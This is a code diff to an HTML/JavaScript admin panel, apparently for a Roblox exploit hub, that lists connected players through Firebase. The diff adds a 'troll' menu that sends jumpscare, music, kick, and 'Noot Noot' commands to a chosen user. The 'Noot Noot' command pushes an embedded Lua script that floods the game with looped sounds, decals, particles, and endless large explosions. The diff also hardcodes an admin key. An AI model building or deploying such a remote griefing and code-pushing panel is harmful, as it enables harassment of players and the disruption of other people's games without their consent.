@@ -55,6 +55,44 @@
   .b-scare { background: #9e6a03; }
   .b-music { background: #8957e5; }
   .b-pat { background: #b3541e; }
+  .b-troll { background: linear-gradient(90deg, #da3633, #8957e5); }
+  .b-noot { background: linear-gradient(90deg, #1a8fff, #3fb950); }
+  .modal-bg { position: fixed; inset: 0; background: rgba(0,0,0,.7); z-index: 9998; display: none; align-items: center; justify-content: center; }
+  .modal-bg.show { display: flex; }
+  .modal {
+    background: #161b22; border: 1px solid #30363d; border-radius: 16px;
+    width: 420px; max-width: 95vw; max-height: 85vh; overflow-y: auto; padding: 0;
+  }
+  .modal-head { display: flex; align-items: center; gap: 14px; padding: 18px 20px 14px; border-bottom: 1px solid #30363d; }
+  .modal-av { width: 60px; height: 60px; border-radius: 50%; flex-shrink: 0;
+    background: linear-gradient(135deg, #1f6feb, #8957e5);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 24px; font-weight: bold; color: #fff; overflow: hidden;
+    box-shadow: 0 0 0 2px #da3633, 0 0 12px rgba(218,54,51,.4); }
+  .modal-av img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; }
+  .modal-info { flex: 1; min-width: 0; }
+  .modal-name { font-weight: bold; font-size: 16px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .modal-sub { font-size: 12px; color: #8b949e; margin-top: 2px; }
+  .modal-close { background: none; border: none; color: #8b949e; font-size: 22px; cursor: pointer; padding: 0 4px; }
+  .modal-close:hover { color: #f85149; }
+  .modal-body { padding: 16px 20px 20px; }
+  .modal-label { font-size: 11px; color: #8b949e; font-weight: bold; text-transform: uppercase; letter-spacing: .5px; margin-bottom: 10px; }
+  .troll-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
+  .troll-grid.three { grid-template-columns: 1fr 1fr 1fr; }
+  .troll-btn {
+    border: none; border-radius: 10px; padding: 14px 10px; font-size: 13px; font-weight: bold;
+    cursor: pointer; color: #fff; display: flex; flex-direction: column; align-items: center; gap: 6px;
+    transition: filter .12s, transform .12s;
+  }
+  .troll-btn:hover { filter: brightness(1.2); transform: scale(1.03); }
+  .troll-btn .icon { font-size: 24px; }
+  .troll-btn.pat { background: linear-gradient(135deg, #b3541e, #da3633); }
+  .troll-btn.scare { background: linear-gradient(135deg, #9e6a03, #da3633); }
+  .troll-btn.music { background: linear-gradient(135deg, #8957e5, #1f6feb); }
+  .troll-btn.kick { background: linear-gradient(135deg, #da3633, #f85149); }
+  .troll-input { width: 100%; padding: 8px 10px; border-radius: 8px; border: 1px solid #30363d; background: #0d1117; color: #fff; font-size: 12px; margin-top: 8px; outline: none; }
+  .troll-input:focus { border-color: #58a6ff; }
+  .modal-footer { text-align: center; padding: 0 20px 16px; font-size: 11px; color: #484f58; }
   .empty { color: #8b949e; font-size: 14px; padding: 30px 0; text-align: center; }
   h2 { font-size: 16px; color: #8b949e; margin: 22px 0 12px; }
   .card.off { opacity: .55; }
@@ -101,10 +139,37 @@
   <h2 id="offTitle" style="display:none">Desconectados recientemente</h2>
   <div class="grid" id="gridOff"></div>
   <div id="toast"></div>
+  <div class="modal-bg" id="trollModal">
+    <div class="modal">
+      <div class="modal-head">
+        <div class="modal-av" id="modalAv"><span id="modalLetter">?</span><img id="modalImg" style="display:none"></div>
+        <div class="modal-info">
+          <div class="modal-name" id="modalName">Usuario</div>
+          <div class="modal-sub" id="modalSub">@user · ID 0</div>
+        </div>
+        <button class="modal-close" id="modalClose">&times;</button>
+      </div>
+      <div class="modal-body">
+        <div class="modal-label">Scripts Troll</div>
+        <div class="troll-grid">
+          <button class="troll-btn pat" data-troll="patricio"><span class="icon">🐽</span>Patricio</button>
+          <button class="troll-btn scare" data-troll="jumpscare"><span class="icon">👹</span>Jumpscare</button>
+          <button class="troll-btn music" data-troll="music"><span class="icon">🎵</span>Música</button>
+          <button class="troll-btn kick" data-troll="kick"><span class="icon">👢</span>Kick</button>
+          <button class="troll-btn noot" data-troll="nootnoot" style="grid-column:1/-1"><span class="icon">🐧</span>Noot Noot</button>
+        </div>
+        <input class="troll-input" id="trollMusicInput" placeholder="Sound ID (para música, opcional)" style="display:none">
+        <input class="troll-input" id="trollKickInput" placeholder="Motivo del kick (opcional)" style="display:none">
+      </div>
+      <div class="modal-footer">Creado por Xplort ✓</div>
+    </div>
+  </div>
 
 <script>
   var ADMIN_KEY = "EXPLHUB_XPLORT_2026";
   var EXPECTED_HASH = "8a504d6625ad4323decbec43f1415168a98897c3199e8265cf949a5004a84025";
+
+  var NOOT_NOOT_SCRIPT = 'local msg = Instance.new("Message",workspace)\nmsg.Text = "Created By SageOfMumsV2 (Pingu) And Xeradius (AzuLX). - Noot Noot Script"\nwait(2)\nmsg:Destroy()\n\npingudecal = "http://www.roblox.com/asset/?id=382332426"\nlocal didpingu = true\n\nfor i,v in pairs(game.Players:GetChildren()) do\n\tif v:IsA("Player") then\n\t\tlocal nooties = Instance.new("Sound", workspace)\n\t\tnooties.SoundId = "rbxassetid://109928136872365"\n\t\tnooties.Volume = 1\n\t\tnooties.Looped = true\n\t\tnooties.PlaybackSpeed = 0.97\n\n\t\tlocal pitch = Instance.new("PitchShiftSoundEffect")\n\t\tpitch.Octave = 1.22\n\t\tpitch.Parent = nooties\n\n\t\tnooties:Play()\n\tend\nend\n\nwait(12)\n\nlocal Sky = Instance.new("Sky", game.Lighting)\nSky.SkyboxBk = pingudecal\nSky.SkyboxDn = pingudecal\nSky.SkyboxFt = pingudecal\nSky.SkyboxLf = pingudecal\nSky.SkyboxRt = pingudecal\nSky.SkyboxUp = pingudecal\n\nlocal function modelasd()\n\tfor i,v in pairs(workspace:GetChildren()) do\n\t\tif v:IsA("Model") then\n\t\t\tfor i,a in pairs(v:GetChildren()) do\n\t\t\t\tlocal top = Instance.new("Decal",a)\n\t\t\t\ttop.Face = "Top"\n\t\t\t\ttop.Texture = pingudecal\n\n\t\t\t\tlocal btm = Instance.new("Decal",a)\n\t\t\t\tbtm.Face = "Bottom"\n\t\t\t\tbtm.Texture = pingudecal\n\n\t\t\t\tlocal lft = Instance.new("Decal",a)\n\t\t\t\tlft.Face = "Left"\n\t\t\t\tlft.Texture = pingudecal\n\n\t\t\t\tlocal rft = Instance.new("Decal",a)\n\t\t\t\trft.Face = "Right"\n\t\t\t\trft.Texture = pingudecal\n\n\t\t\t\tlocal frnt = Instance.new("Decal",a)\n\t\t\t\tfrnt.Face = "Front"\n\t\t\t\tfrnt.Texture = pingudecal\n\n\t\t\t\tlocal bk = Instance.new("Decal",a)\n\t\t\t\tbk.Face = "Back"\n\t\t\t\tbk.Texture = pingudecal\n\n\t\t\t\tlocal VTest = Instance.new("ParticleEmitter")\n\t\t\t\tVTest.Parent = a\n\t\t\t\tVTest.Texture = pingudecal\n\t\t\t\tVTest.Speed = NumberRange.new(200)\n\t\t\t\tVTest.Rate = 200\n\t\t\t\tVTest.Size = NumberSequence.new(10000,10000)\n\t\t\t\tVTest.Lifetime = NumberRange.new(1000)\n\n\t\t\t\tlocal pepe = coroutine.create(function()\n\t\t\t\t\twhile wait() do\n\t\t\t\t\t\tlocal Explosion = Instance.new("Explosion",a)\n\t\t\t\t\t\tExplosion.BlastRadius = 10000\n\t\t\t\t\tend\n\t\t\t\tend)\n\t\t\t\tcoroutine.resume(pepe)\n\t\t\tend\n\t\tend\n\tend\nend\n\nlocal function partasd()\n\tfor i,a in pairs(workspace:GetChildren()) do\n\t\tlocal top = Instance.new("Decal",a)\n\t\ttop.Face = "Top"\n\t\ttop.Texture = pingudecal\n\n\t\tlocal btm = Instance.new("Decal",a)\n\t\tbtm.Face = "Bottom"\n\t\tbtm.Texture = pingudecal\n\n\t\tlocal lft = Instance.new("Decal",a)\n\t\tlft.Face = "Left"\n\t\tlft.Texture = pingudecal\n\n\t\tlocal rft = Instance.new("Decal",a)\n\t\trft.Face = "Right"\n\t\trft.Texture = pingudecal\n\n\t\tlocal frnt = Instance.new("Decal",a)\n\t\tfrnt.Face = "Front"\n\t\tfrnt.Texture = pingudecal\n\n\t\tlocal bk = Instance.new("Decal",a)\n\t\tbk.Face = "Back"\n\t\tbk.Texture = pingudecal\n\n\t\tlocal VTest = Instance.new("ParticleEmitter")\n\t\tVTest.Parent = a\n\t\tVTest.Texture = pingudecal\n\t\tVTest.Speed = NumberRange.new(200)\n\t\tVTest.Rate = 200\n\t\tVTest.Lifetime = NumberRange.new(1000)\n\t\tVTest.Size = NumberSequence.new(10000,10000)\n\n\t\tlocal pepe = coroutine.create(function()\n\t\t\twhile wait() do\n\t\t\t\tif a.Name ~= "Head" or "Torso" or "Left Arm" or "Right Arm" or "Left Leg" or "Right Leg" then\n\t\t\t\t\tlocal Explosion = Instance.new("Explosion",a)\n\t\t\t\t\tExplosion.BlastRadius = 10000\n\t\t\t\tend\n\t\t\tend\n\t\tend)\n\t\tcoroutine.resume(pepe)\n\tend\nend\n\npartasd()\nmodelasd()';
 
   firebase.initializeApp({
     databaseURL: "https://explhub-default-rtdb.firebaseio.com"
@@ -259,7 +324,7 @@
         banBtn +
         '<button class="b-scare" data-act="scare" data-uid="' + esc(uid) + '">Jumpscare</button>' +
         '<button class="b-music" data-act="music" data-uid="' + esc(uid) + '">Música</button>' +
-        '<button class="b-pat" data-act="pat" data-uid="' + esc(uid) + '">Patricio</button>';
+        '<button class="b-troll" data-act="troll" data-uid="' + esc(uid) + '">🎯 Troll</button>';
     return '<div class="card' + (isBanned ? " is-banned" : "") + (isRecent ? " off" : "") + '">' +
       '<div class="top">' +
         avatarHtml(uid, d.displayName || d.username) +
@@ -330,7 +395,86 @@
     else if (act === "unban") doUnban(uid);
     else if (act === "scare") doScare(uid);
     else if (act === "music") doMusic(uid);
-    else if (act === "pat") { pushCmd(uid, "patricio", {}); toast("Patricio enviado ✓"); }
+    else if (act === "troll") openTrollModal(uid);
+  });
+
+  var trollModalUid = null;
+  function openTrollModal(uid) {
+    trollModalUid = uid;
+    var u = cache[uid] || {};
+    var name = u.displayName || u.username || uid;
+    var letter = (name.charAt(0) || "?").toUpperCase();
+    document.getElementById("modalLetter").textContent = letter;
+    document.getElementById("modalName").textContent = name;
+    document.getElementById("modalSub").textContent = "@" + (u.username || "?") + " · ID " + uid;
+    var img = document.getElementById("modalImg");
+    var cached = avatarCache[uid];
+    if (cached && cached !== "pending" && cached !== "letter") {
+      img.src = cached; img.style.display = "block";
+    } else {
+      img.style.display = "none";
+      fetch("https://thumbnails.roblox.com/v1/users/avatar-headshot?userId=" + encodeURIComponent(uid) + "&size=150x150&format=Png&isCircular=false")
+        .then(function(r) { return r.json(); })
+        .then(function(j) {
+          if (j && j.data && j.data[0] && j.data[0].imageUrl) {
+            img.src = j.data[0].imageUrl; img.style.display = "block";
+          }
+        }).catch(function() {});
+    }
+    document.getElementById("trollMusicInput").style.display = "none";
+    document.getElementById("trollKickInput").style.display = "none";
+    document.getElementById("trollModal").classList.add("show");
+  }
+  document.getElementById("modalClose").addEventListener("click", function() {
+    document.getElementById("trollModal").classList.remove("show");
+  });
+  document.getElementById("trollModal").addEventListener("click", function(e) {
+    if (e.target === this) this.classList.remove("show");
+  });
+  document.body.addEventListener("click", function(e) {
+    var btn = e.target.closest("[data-troll]");
+    if (btn) {
+      e.stopPropagation();
+      if (!trollModalUid) return;
+      var action = btn.getAttribute("data-troll");
+      if (action === "patricio") {
+        pushCmd(trollModalUid, "patricio", {});
+        toast("Patricio enviado ✓");
+        document.getElementById("trollModal").classList.remove("show");
+      } else if (action === "jumpscare") {
+        pushCmd(trollModalUid, "jumpscare", { imageId: "10509128628", soundId: "" });
+        toast("Jumpscare enviado ✓");
+        document.getElementById("trollModal").classList.remove("show");
+      } else if (action === "music") {
+        var inp = document.getElementById("trollMusicInput");
+        if (inp.style.display === "none") { inp.style.display = "block"; inp.focus(); return; }
+        var id = inp.value || "";
+        pushCmd(trollModalUid, "music", { assetId: id, volume: "3" });
+        toast(id ? "Música enviada ✓" : "Música detenida ✓");
+        document.getElementById("trollModal").classList.remove("show");
+      } else if (action === "kick") {
+        var ki = document.getElementById("trollKickInput");
+        if (ki.style.display === "none") { ki.style.display = "block"; ki.focus(); return; }
+        pushCmd(trollModalUid, "kick", { reason: ki.value || "" });
+        toast("Kick enviado ✓");
+        document.getElementById("trollModal").classList.remove("show");
+      } else if (action === "nootnoot") {
+        pushCmd(trollModalUid, "nootnoot", { script: NOOT_NOOT_SCRIPT });
+        toast("Noot Noot enviado ✓");
+        document.getElementById("trollModal").classList.remove("show");
+      }
+      return;
+    }
+    var b = e.target.closest("button[data-act]");
+    if (!b) return;
+    var act = b.getAttribute("data-act"), uid = b.getAttribute("data-uid");
+    if (act === "join") doJoin(uid);
+    else if (act === "kick") doKick(uid);
+    else if (act === "ban") { if (confirm("¿Banear a " + ((cache[uid] || {}).username || uid) + "?")) doBan(uid); }
+    else if (act === "unban") doUnban(uid);
+    else if (act === "scare") doScare(uid);
+    else if (act === "music") doMusic(uid);
+    else if (act === "troll") openTrollModal(uid);
   });
 
   document.getElementById("search").addEventListener("input", render);
